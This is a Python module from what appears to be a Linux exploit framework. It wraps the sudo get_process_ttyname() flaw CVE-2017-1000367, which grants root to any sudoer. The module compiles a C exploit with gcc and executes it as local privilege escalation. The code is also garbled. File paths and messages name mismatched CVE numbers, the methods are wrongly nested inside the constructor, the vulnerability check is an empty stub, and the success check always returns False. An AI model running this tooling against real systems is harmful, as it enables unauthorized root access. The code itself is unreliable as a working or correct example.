"""
adapted from:
https://github.com/c0d3z3r0/sudo-CVE-2017-1000367/sudopwn.c
"""
import os
import subprocess
from exploits.exploit import Exploit
from constants import PLAYGROUND_PATH, LINUX_EXPLOIT_PATH, HIGH_RELIABILITY, color_print
class CVE20171000367(Exploit):
	def __init__(self):
		super().__init__()
		self.name = "CVE-2017-1000367"
		self.brief_desc = "vulnerability in sudo's get_process_ttyname() allows any sudoer to gain root"
		self.reliability = HIGH_RELIABILITY
		self.vulnerable_kernels = {
			"confirmed": [

			],
			"potential": [

			]
		}
		self.source_c_path = os.path.join(LINUX_EXPLOIT_PATH, "CVE20171000112.c")
		self.compilation_path = os.path.join(PLAYGROUND_PATH, "CVE20171000112")
		self.compilation_command = ["gcc", "-o", self.compilation_path, self.source_c_path, "-lutil"]
		self.exploit_command = self.compilation_path

		def determine_vulnerability(self):
			se_linux_enabled_command = "/etc/selinux/config"

		def confirm_exploitation(self):
			"""
			confirm_exploitation

			Checks for implementation specific details that confirm successful kernel exploitation
			:return: True or False
			"""
			return False  # TODO: complete this vuln check to check /tmp/nonce for a specific value

		def exploit(self):
			color_print("\t[*] compiling: \'{}\'".format(" ".join(self.compilation_command)))
			return_code = subprocess.call(self.compilation_command)
			if return_code == 0 and os.path.exists(self.compilation_path):
				color_print("\t[*] exploiting")
				subprocess.call(self.exploit_command)  # TODO: need to make it write a nonce to /tmp/nonce
				if self.confirm_exploitation():
					color_print("\t[+] exploitation of CVE201710012 successful!", color="green", bold=True)
				else:
					self.exploit_failure("not vulnerable to CVE201710012")